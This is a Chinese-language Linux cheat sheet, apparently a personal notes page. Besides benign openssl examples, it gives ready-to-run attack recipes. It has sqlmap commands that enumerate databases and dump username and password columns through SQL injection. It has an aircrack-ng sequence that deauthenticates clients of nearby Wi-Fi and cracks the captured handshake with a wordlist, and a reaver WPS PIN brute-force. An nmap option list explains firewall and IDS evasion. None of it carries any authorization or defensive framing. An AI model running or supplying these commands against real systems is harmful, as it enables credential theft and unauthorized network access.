# [Home](../README.md)
## [Linux](https://www.apiref.com/linux-zh/linux-command-manual.html)

![linux](https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg)

### Linux发行版
- [Ubuntu](http://www.ubuntu.com/)
- [Fedora](http://fedoraproject.org/)
- [Debian](http://www.debian.org/)
- [CentOS](http://www.centos.org/)
- [Arch](https://www.archlinux.org/)
- [Kali](https://www.kali.org/)
- [ElementaryOS](https://elementary.io/zh_CN/)
- [Nitrux](https://nxos.org/)

### openssl
> 加密

```shell
echo '明文' | openssl aes-128-cbc -k "key" -base64
```

>解密

```shell
echo "U2FsdGVkX19nGdcPGq41k5Nq92WRzXIkH1YVcBAjJpQ=" | openssl aes-128-cbc -d -k "key" -base64
echo "U2FsdGVkX19nGdcPGq41k5Nq92WRzXIkH1YVcBAjJpQ=" | tr ' ' '\n' | openssl aes-128-cbc -d -k "key" -base64
```

```shell
#Standard commands
asn1parse         ca                ciphers           cms
crl               crl2pkcs7         dgst              dhparam
dsa               dsaparam          ec                ecparam
enc               engine            errstr            gendsa
genpkey           genrsa            help              list
nseq              ocsp              passwd            pkcs12
pkcs7             pkcs8             pkey              pkeyparam
pkeyutl           prime             rand              rehash
req               rsa               rsautl            s_client
s_server          s_time            sess_id           smime
speed             spkac             srp               storeutl
ts                verify            version           x509

#Message Digest commands (see the `dgst' command for more details)
blake2b512        blake2s256        gost              md4
md5               mdc2              rmd160            sha1
sha224            sha256            sha3-224          sha3-256
sha3-384          sha3-512          sha384            sha512
sha512-224        sha512-256        shake128          shake256
sm3

#Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64
bf                bf-cbc            bf-cfb            bf-ecb
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb
cast5-ofb         des               des-cbc           des-cfb
des-ecb           des-ede           des-ede-cbc       des-ede-cfb
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb
des-ede3-ofb      des-ofb           des3              desx
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc
rc2-cfb           rc2-ecb           rc2-ofb           rc4
rc4-40            seed              seed-cbc          seed-cfb
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb
sm4-ctr           sm4-ecb           sm4-ofb           zlib
```
### SQL注入
```shell
sqlmap -u url --dbs --current-user	
sqlmap -u url --dbms mysql -D dbName --tables
sqlmap -u url --dbms mysql -T admin --columns
sqlmap -u url --dbms mysql -T admin -C field1, field2 --dump

sqlmap -u url?id=1
sqlmap -u url?id=1 --dbs
sqlmap -u url?id=1 --current-db		#列出当前使用的数据库名
sqlmap -u url?id=1 --tables -D "db_name"
sqlmap -u url?id=1 --columns -T "tb_name" -D "db_name"
sqlmap -u url?id=1 --dump -C "username, password" -T "tb_name" -D "db_name"

sqlmap -u url?id=1 --is-dbs #判断该注入点是否有管理员权限，true表示管理员
```

### wifi密码跑字典
```shell
airmon-ng check kill			#杀死进程
airmon-ng start wlan0			#是wlan0网卡开起monitor mode
airodump-ng wlan0mon			#查看附件wifi
airodump-ng --bssid mac地址 -c CH值 -w crack wlan0mon		#开始抓包

aireplay-ng --deauth 10 -a mac地址 -c 抓到的mac地址 wlan0mon
aircrack-ng -w 密码字典路径 crack-01.cap

airmon-ng stop wlan0mon		#关闭wlan0网卡monitor mode
```
### wifi跑pin码
```shell
airmon-ng start wlan0
wash -i wlan0mon
reaver -i wlan0mon -b mac地址 -S -N -vv -c CH值
```

### nmap工具

#### 命令参数
```shell
-sT    TCP connect() 扫描，这是最基本的 TCP 扫描方式。这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。    
-sS    TCP 同步扫描 (TCP SYN)，因为不必全部打开一个 TCP 连接，所以这项技术通常称为半开扫描 (half-open)。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要 root 权限来定制 SYN 数据包。    
-sF,-sX,-sN    秘密 FIN 数据包扫描、圣诞树 (Xmas Tree)、空 (Null) 扫描模式。这些扫描方式的理论依据是：关闭的端口需要对你的探测包回应 RST 包，而打开的端口必需忽略有问题的包（参考 RFC 793 第 64 页）。    
-sP    ping 扫描，用 ping 方式检查网络上哪些主机正在运行。当主机阻塞 ICMP echo 请求包是 ping 扫描是无效的。nmap 在任何情况下都会进行 ping 扫描，只有目标主机处于运行状态，才会进行后续的扫描。    
-sU    UDP 的数据包进行扫描，如果你想知道在某台主机上提供哪些 UDP（用户数据报协议，RFC768) 服务，可以使用此选项。    
-sA    ACK 扫描，这项高级的扫描方法通常可以用来穿过防火墙。    
-sW    滑动窗口扫描，非常类似于 ACK 的扫描。    
-sR    RPC 扫描，和其它不同的端口扫描方法结合使用。    
-b    FTP 反弹攻击 (bounce attack)，连接到防火墙后面的一台 FTP 服务器做代理，接着进行端口扫描。
-P0    在扫描之前，不 ping 主机。    
-PT    扫描之前，使用 TCP ping 确定哪些主机正在运行。    
-PS    对于 root 用户，这个选项让 nmap 使用 SYN 包而不是 ACK 包来对目标主机进行扫描。    
-PI    设置这个选项，让 nmap 使用真正的 ping(ICMP echo 请求）来扫描目标主机是否正在运行。    
-PB    这是默认的 ping 扫描选项。它使用 ACK(-PT) 和 ICMP(-PI) 两种扫描类型并行扫描。如果防火墙能够过滤其中一种包，使用这种方法，你就能够穿过防火墙。    
-O    这个选项激活对 TCP/IP 指纹特征 (fingerprinting) 的扫描，获得远程主机的标志，也就是操作系统类型。    
-I    打开 nmap 的反向标志扫描功能。    
-f    使用碎片 IP 数据包发送 SYN、FIN、XMAS、NULL。包增加包过滤、入侵检测系统的难度，使其无法知道你的企图。    
-v    冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。    
-S <IP>    在一些情况下，nmap 可能无法确定你的源地址 (nmap 会告诉你）。在这种情况使用这个选项给出你的 IP 地址。    
-g port    设置扫描的源端口。一些天真的防火墙和包过滤器的规则集允许源端口为 DNS(53) 或者 FTP-DATA(20) 的包通过和实现连接。显然，如果攻击者把源端口修改为 20 或者 53，就可以摧毁防火墙的防护。    
-oN    把扫描结果重定向到一个可读的文件 logfilename 中。    
-oS    扫描结果输出到标准输出。    
--host_timeout    设置扫描一台主机的时间，以毫秒为单位。默认的情况下，没有超时限制。    
--max_rtt_timeout    设置对每次探测的等待时间，以毫秒为单位。如果超过这个时间限制就重传或者超时。默认值是大约 9000 毫秒。    
--min_rtt_timeout    设置 nmap 对每次探测至少等待你指定的时间，以毫秒为单位。    
-M count    置进行 TCP connect() 扫描时，最多使用多少个套接字进行并行的扫描。著作权归LyShark所有 

```